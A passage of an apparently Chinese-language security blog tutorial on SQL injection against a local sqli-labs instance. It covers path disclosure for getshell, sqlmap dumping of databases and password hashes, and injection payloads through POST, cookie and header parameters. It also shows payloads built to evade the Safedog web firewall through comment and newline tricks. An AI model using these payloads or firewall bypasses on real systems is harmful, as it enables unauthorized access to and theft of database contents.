-<p><a href="http://www.doushanedu.cn/" target="_blank" rel="noopener">www.doushanedu.cn/</a>             /www/wwwroot/zhanqun/data/function.php</p>
-<h5 id="2、通过对方网站遗留文件爆出路径"><a href="#2、通过对方网站遗留文件爆出路径" class="headerlink" title="2、通过对方网站遗留文件爆出路径"></a>2、通过对方网站遗留文件爆出路径</h5><p>常见的遗留的phpinfor.php文件</p>
-<h5 id="3、通过漏洞爆出路径"><a href="#3、通过漏洞爆出路径" class="headerlink" title="3、通过漏洞爆出路径"></a>3、通过漏洞爆出路径</h5><p>discuz爆出路径</p>
-<h5 id="4、根据对方web服务器类型猜解路径"><a href="#4、根据对方web服务器类型猜解路径" class="headerlink" title="4、根据对方web服务器类型猜解路径"></a>4、根据对方web服务器类型猜解路径</h5><p>IIS:\inetpub\wwwroot\</p>
-<p>PHPSTUDY2020:\phpstudy pro\www</p>
-<p>PHPSTUDY2018:\phpStudy\PHPTutorial\WWW</p>
-<p>只要爆出来路径，并且secure_file_priv为空，即可写入文件getshell</p>
-<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><h5 id="爆出库名"><a href="#爆出库名" class="headerlink" title="爆出库名"></a>爆出库名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 --dbs</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062379253.png" alt="1584062306167"></p>
-<h5 id="爆出想要查询数据库的表名，这里查询security"><a href="#爆出想要查询数据库的表名，这里查询security" class="headerlink" title="爆出想要查询数据库的表名，这里查询security"></a>爆出想要查询数据库的表名，这里查询security</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 -D security --tables</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062748704.png" alt="1584062379253"></p>
-<h5 id="爆出字段，这里查询users表"><a href="#爆出字段，这里查询users表" class="headerlink" title="爆出字段，这里查询users表"></a>爆出字段，这里查询users表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 -D security -T users --columns</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062849649.png" alt="1584062638658"></p>
-<h5 id="爆出数据，这里查询password，username，这里使用–dump-荡出整个数据库"><a href="#爆出数据，这里查询password，username，这里使用–dump-荡出整个数据库" class="headerlink" title="爆出数据，这里查询password，username，这里使用–dump 荡出整个数据库"></a>爆出数据，这里查询password，username，这里使用–dump 荡出整个数据库</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 -D security -T users -C password,username --dump</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062904145.png" alt="1584062748704"></p>
-<h5 id="还可以使用sqlmap查看当前用户"><a href="#还可以使用sqlmap查看当前用户" class="headerlink" title="还可以使用sqlmap查看当前用户"></a>还可以使用sqlmap查看当前用户</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 --users</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062987595.png" alt="1584062849649"></p>
-<h5 id="如果用户为root用户可以查询数据库密码"><a href="#如果用户为root用户可以查询数据库密码" class="headerlink" title="如果用户为root用户可以查询数据库密码"></a>如果用户为root用户可以查询数据库密码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 --password</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584068754403.png" alt="1584062904145"></p>
-<h5 id="爆出以上加密密码，使用md5在线解密，查看密码"><a href="#爆出以上加密密码，使用md5在线解密，查看密码" class="headerlink" title="爆出以上加密密码，使用md5在线解密，查看密码"></a>爆出以上加密密码，使用md5在线解密，查看密码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br><span class="line">查看这个解密之后的值，可以看到，当前数据库密码为root</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584069595543.png" alt="1584062987595"></p>
-<h5 id="查看当前数据库"><a href="#查看当前数据库" class="headerlink" title="查看当前数据库"></a>查看当前数据库</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --current-db</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583917392652.png" alt="1584063112661"></p>
-<h4 id="注意：sqlmap虽然好用，但必须明白其中的原理，否则挖掘0day漏洞时，会不知所措，不要成为只会用神器的”脚本小子”"><a href="#注意：sqlmap虽然好用，但必须明白其中的原理，否则挖掘0day漏洞时，会不知所措，不要成为只会用神器的”脚本小子”" class="headerlink" title="注意：sqlmap虽然好用，但必须明白其中的原理，否则挖掘0day漏洞时，会不知所措，不要成为只会用神器的”脚本小子”"></a>注意：sqlmap虽然好用，但必须明白其中的原理，否则挖掘0day漏洞时，会不知所措，不要成为只会用神器的”脚本小子”</h4><h4 id="之前都是以GET请求注入，我们现在要以多种请求注入"><a href="#之前都是以GET请求注入，我们现在要以多种请求注入" class="headerlink" title="之前都是以GET请求注入，我们现在要以多种请求注入"></a>之前都是以GET请求注入，我们现在要以多种请求注入</h4><h5 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h5><h5 id="GET-最常见的请求方式"><a href="#GET-最常见的请求方式" class="headerlink" title="GET    最常见的请求方式"></a>GET    最常见的请求方式</h5><h5 id="POST-一般用于登录框"><a href="#POST-一般用于登录框" class="headerlink" title="POST     一般用于登录框"></a>POST     一般用于登录框</h5><h5 id="COOKIE-想用哪里用哪里"><a href="#COOKIE-想用哪里用哪里" class="headerlink" title="COOKIE    想用哪里用哪里"></a>COOKIE    想用哪里用哪里</h5><h4 id="POST请求注入"><a href="#POST请求注入" class="headerlink" title="POST请求注入"></a>POST请求注入</h4><p>确定字段数</p>
-<h5 id="只需要在登录框提交sql注入语句"><a href="#只需要在登录框提交sql注入语句" class="headerlink" title="只需要在登录框提交sql注入语句"></a>只需要在登录框提交sql注入语句</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里测试了，他的字段数是2</span><br><span class="line">例如：</span><br><span class="line">-1&#39; order by 2</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584068845245.png" alt="1584068754403"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看当前数据库</span><br><span class="line">-1&#39; union select 1,database() #</span><br><span class="line"></span><br><span class="line">后面查询跟Union相同</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584069834914.png" alt="1584068845245"></p>
-<h4 id="COOKIE请求注入"><a href="#COOKIE请求注入" class="headerlink" title="COOKIE请求注入"></a>COOKIE请求注入</h4><h5 id="如果获取到cookie呢？"><a href="#如果获取到cookie呢？" class="headerlink" title="如果获取到cookie呢？"></a>如果获取到cookie呢？</h5><p>可以使用burp抓包，然后在cookie后写入sql注入语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里用-1&#39; order by 3 # 查看字段是是否是3，发现页面返回正常</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584069642030.png" alt="1584069595543"></p>
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584069770460.png" alt="1584069642030"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看-1&#39; order by 4 # 字段4是否是正常，页面返回错误，我们可以确定字段是3</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584078476353.png" alt="1584069691296"></p>
-<h5 id="查看当前库名"><a href="#查看当前库名" class="headerlink" title="查看当前库名"></a>查看当前库名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; union select 1,2,database()# 查看当前库名，如果要查询表名和字段名数据，和union注入相同</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584183906874.png" alt="1584069834914"></p>
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584080162515.png" alt="1584069770460"></p>
-<h4 id="HTTP头部注入"><a href="#HTTP头部注入" class="headerlink" title="HTTP头部注入"></a>HTTP头部注入</h4><p>如果user-Agent这里，如果添加一个sql查询，就可以通过user-Agent进行sql注入</p>
-<h4 id="参数类型注入-三种"><a href="#参数类型注入-三种" class="headerlink" title="参数类型注入(三种)"></a>参数类型注入(三种)</h4><h5 id="1、数字型"><a href="#1、数字型" class="headerlink" title="1、数字型"></a>1、数字型</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">语句：select * from mars where id&#x3D;1</span><br><span class="line"></span><br><span class="line">连接后就构造成了sql语句的查询</span><br><span class="line">连接：select * from mars where id&#x3D;-1 union select 1,database(),user()</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ID：-1 union select 1,database(),user()</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584069691296.png" alt="1584078476353"></p>
-<h5 id="2、字符型"><a href="#2、字符型" class="headerlink" title="2、字符型"></a>2、字符型</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">语句：select * from mars where id&#x3D;&#39;mars&#39;</span><br><span class="line"></span><br><span class="line">连接：select * from mars where id&#x3D;&#39;-1’ union select 1,database(),user()--+&#39;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ID：-1’ union select 1,database(),user()--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584184821104.png" alt="1584078842647"></p>
-<h5 id="3、搜索型"><a href="#3、搜索型" class="headerlink" title="3、搜索型"></a>3、搜索型</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">语句：select * from mars where mars like id&#x3D;&#39;%a%&#39;</span><br><span class="line"></span><br><span class="line">%&#39;闭合前面，后面虽然也可以用注释符注释掉但不推荐 还是用&#39;%来将其闭合，中间剩下的就是sql注入语句</span><br><span class="line">连接：select * from mars where mars like id&#x3D;&#39;%%&#39; union select 1,database(),user()&#39;%%&#39;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ID：%&#39; union select 1,database(),user()&#39;%</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584078842647.png" alt="1584080162515"></p>
-<h3 id="绕过过滤注释符号的注入"><a href="#绕过过滤注释符号的注入" class="headerlink" title="绕过过滤注释符号的注入"></a>绕过过滤注释符号的注入</h3><p>如果过滤注释符号</p>
-<p>使用preg_replace函数 </p>
-<p>注释注入在这里就不工作了，怎么办呢？</p>
-<p>注入，不一定使用注释，也可以使用闭合</p>
-<p>闭合不好之处就是，执行点少</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里使用--+还是返回正确页面，因为网页将注释符给过滤掉了</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584185554495.png" alt="1584183906874"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">使用union select强制闭合</span><br><span class="line">$sql &#x3D; select * from users where id&#x3D;&#39;$id&#39;</span><br><span class="line">payload:-1&#39; union select 1,2,&#39;3</span><br><span class="line"></span><br><span class="line">我们来进行一个带入</span><br><span class="line">可以看到，带入之后-1被闭合了，3被闭合了，所以我们只有在2的位置进行一个sql语句</span><br><span class="line">执行点只有2，因为1被省略了网站不显示，3被闭合了不能使用</span><br><span class="line">$sql &#x3D; select * from users where id&#x3D;&#39;-1&#39; union select 1,2,&#39;3&#39;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584185630448.png" alt="1584184821104"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">还有一种就是 or 闭合</span><br><span class="line">select * from users where id&#x3D;&#39;$id&#39;</span><br><span class="line">plyload:-1&#39; union select 1,2,3 or &#39;1&#39;&#x3D;&#39;1</span><br><span class="line"></span><br><span class="line">这里还是 -1闭合了，or后面的全部闭合了，执行中间的一部分，</span><br><span class="line">带入：select * from users where id&#x3D;&#39;-1&#39; union select 1,2,3 or &#39;1&#39;&#x3D;&#39;1&#39;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584063112661.png" alt="1584185554495"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">虽然执行中间一部分就是union select 1,2,3，但是可控点还是只有2，只能在2的位置进行查询</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584186947810.png" alt="1584185630448"></p>
-<h4 id="扩展思考"><a href="#扩展思考" class="headerlink" title="扩展思考"></a>扩展思考</h4><p>搜索性注入</p>
-<p>select * from users where username like ‘%mysql%’</p>
-<p>两种方法</p>
-<p>第一种：注释</p>
-<p>%’ union select 1,2,3 –+</p>
-<p>第二种：闭合</p>
-<p>%’ union select 1,2,3 ‘%</p>
-<h3 id="过安全狗"><a href="#过安全狗" class="headerlink" title="过安全狗"></a>过安全狗</h3><h5 id="安全狗-waf-，也被称为网站应用级入侵防御系统，就是可以通过一些过滤来达到攻击效果"><a href="#安全狗-waf-，也被称为网站应用级入侵防御系统，就是可以通过一些过滤来达到攻击效果" class="headerlink" title="安全狗(waf)，也被称为网站应用级入侵防御系统，就是可以通过一些过滤来达到攻击效果"></a>安全狗(waf)，也被称为网站应用级入侵防御系统，就是可以通过一些过滤来达到攻击效果</h5><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p><a href="http://free.safedog.cn/website_safedog.html" target="_blank" rel="noopener">http://free.safedog.cn/website_safedog.html</a></p>
-<p>注意：一定要改成系统服务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们可以看到正常输入网址已经被拦截了，我们可以输出union select 发现页面还是显示防火墙，然后将a加入到union和select发现出错了，表示防火墙拦截的不是union也不是select而是拦截的 union select他们的一个整体</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584187385821.png" alt="1584186947810"></p>
-<p>首先要判断安全狗识别的是哪一个关键字，怎么判断，在前面加上，干扰字符，比如a</p>
-<p>判断安全狗拦截的union select 而并非union和select</p>
-<p>我们看到aselect不会被拦截如何让aselect不执行给安全狗看</p>
-<p>/* ! */符号是mysql一个特性就是，安全狗他在士必得时候会认为这是一个注释，不会对系统造成畏寒，所以，安全狗就不去拦截。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union &#x2F;*select*&#x2F;1,2,3</span><br><span class="line">我们发现使用注释之后安全狗还进行拦截，怎么办呢</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584187649190.png" alt="1584187385821"></p>
-<p>让aselect中a执行给安全狗看，实际执行的是select</p>
-<p>%0a    换行</p>
-<p>%23    注释</p>
-<p>让a单独在一行，然后把这个a注释掉，select是不是就正常执行了，安全狗这边会认为是一个正常的注释，不会拦截</p>
-<p>payload：-1 union %23a%0a//select/1,2,3</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,2,3</span><br><span class="line">这里我们发现了我们成功地绕过了安全狗的拦截</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584187950038.png" alt="1584187649190"></p>
-<p>如果我们要查询数据库，还是按照之前的直接在2的位置打上database()是会被安全狗拦截的，所以我们判断安全狗拦截的是那一块内容，我们尝试在database(a)的括号里面加上一个a试试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,database(a),3</span><br><span class="line">发现报错了，表示括号里的a没有被拦截，我们就可以判断安全狗拦截的是database而不是括号</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584188802374.png" alt="1584187950038"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">所以我将其database和()括号分开</span><br><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,&#x2F;*!database*&#x2F;&#x2F;*!()*&#x2F;,3</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584188366327.png" alt="1584188050784"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们发现还拦截，所以我们就可以按照之前换行，注释a换行database的方法来将database显示出来</span><br><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,%23a%0a&#x2F;*!database*&#x2F;&#x2F;*!()*&#x2F;,3</span><br><span class="line">我们发现成功地返回了我们的库名，也就说明了安全狗没有去拦截这样的一个函数</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584188050784.png" alt="1584188366327"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,group_concat table_name from information_schema.schemata,3</span><br><span class="line">我们可以在每个函数里面都放一个a查看哪一个函数被拦截，之后经过测试from被拦截了，其他都没有被拦截然后我们可以将from进行a注释换行</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584189188995.png" alt="1584188802374"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先尝试&#x2F;*!from*&#x2F;如果被拦截还是用%23a%0a&#x2F;*!from*&#x2F;</span><br><span class="line"></span><br><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,group_concat table_name %23a%0a&#x2F;*!from*&#x2F; information_schema.schemata,3</span><br><span class="line">我们发现成功地将内容显示出来了</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584189398751.png" alt="1584189188995"></p>
-<p>获取一下表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,group_concat table_name %23a%0a&#x2F;*!from*&#x2F; information_schema.tables where table_schema&#x3D;&#39;security&#39;,3</span><br><span class="line">直接返回成功，where并没有被拦截</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584189864602.png" alt="1584189398751"></p>
-<p>安全狗防御防御效果很low。实际情况下，安全狗用的是最多的，但是，也是最好过的</p>
-<p>安全狗，aliyundun，很好过，但是Godaddy很难过</p>
-<p>mysql版本判断特性</p>
-<p>/* 44509select */在mysql中不会进行报错的，这个44509是mysql的一个正常的判断，当mysql的版本大于44509就会执行select语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union &#x2F;*44509select*&#x2F; 1,2,3</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200403142025653.png" alt="image-20200403142025653"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+    </nav>
   
 </div>
       <footer id="footer">
